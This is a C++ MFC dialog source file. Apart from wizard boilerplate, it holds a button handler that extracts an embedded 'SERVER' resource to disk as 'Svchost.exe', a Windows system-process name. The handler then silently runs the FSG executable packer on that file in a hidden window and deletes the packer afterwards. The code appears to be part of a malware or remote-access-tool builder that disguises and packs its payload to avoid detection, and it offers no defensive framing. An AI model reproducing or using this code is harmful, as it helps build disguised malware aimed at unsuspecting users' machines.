// TestDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Test.h"
#include "TestDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CTestDlg dialog

CTestDlg::CTestDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CTestDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CTestDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CTestDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CTestDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CTestDlg, CDialog)
	//{{AFX_MSG_MAP(CTestDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_START, OnButtonStart)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CTestDlg message handlers

BOOL CTestDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CTestDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CTestDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


BOOL LoadSource(UINT resoure_id , const char * type , const char * filepath)
{
	//获得资源指针
	HRSRC hRsrc = ::FindResource( NULL , MAKEINTRESOURCE( resoure_id ) , type );
	
	if( hRsrc )
	{   //获得资源大小
		DWORD size = ::SizeofResource( NULL , hRsrc );
        //将资源载入内存
		HGLOBAL  handle = ::LoadResource( NULL , hRsrc );
        //写入文件     
		if( handle )
		{   //定位资源位置
			BYTE *MemPtr = (BYTE *)LockResource( handle ); 

			CFile file;
		//xxx/xx/xxx/xx/Svchost.exe
			if( file.Open( filepath , CFile::modeCreate | CFile::modeWrite ) )
			{
				file.Write( MemPtr , size );

				file.Close( );
			}
			::UnlockResource( handle );
		}
		::FreeResource( handle );
		return TRUE;
	}
	return FALSE;
}

void CTestDlg::OnButtonStart() 
{
	// TODO: Add your control notification handler code here

		char LocalPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH,LocalPath);
		strcat(LocalPath,"\\Svchost.exe");
		LoadSource(IDR_SERVER,"SERVER",LocalPath);//生成文件

		char FSGPath[MAX_PATH]={0};
		GetCurrentDirectory(MAX_PATH,FSGPath);
		strcat(FSGPath,"\\fsg.exe");
		
		LoadSource(IDR_FSG,"FSG",FSGPath);
		strcat(FSGPath," ");

		char fsgini[MAX_PATH];
		GetCurrentDirectory(MAX_PATH,fsgini);
		strcat(fsgini,"\\fsg.ini");
		LoadSource(IDR_FSG_INI,"FSG",fsgini);

		strcat(FSGPath,"Svchost.exe"); //LocalPath

		PROCESS_INFORMATION PI;
		STARTUPINFO SI;
		memset(&SI, 0, sizeof(SI));
		SI.cb = sizeof(SI);
		SI.dwFlags =STARTF_USESHOWWINDOW; 
		SI.wShowWindow = SW_HIDE;
		CreateProcess(NULL, FSGPath, NULL, NULL, FALSE,NORMAL_PRIORITY_CLASS, NULL, NULL, &SI, &PI);
		WaitForSingleObject(PI.hProcess,INFINITE);
		DeleteFile("fsg.exe");
		DeleteFile("fsg.ini");
	
}
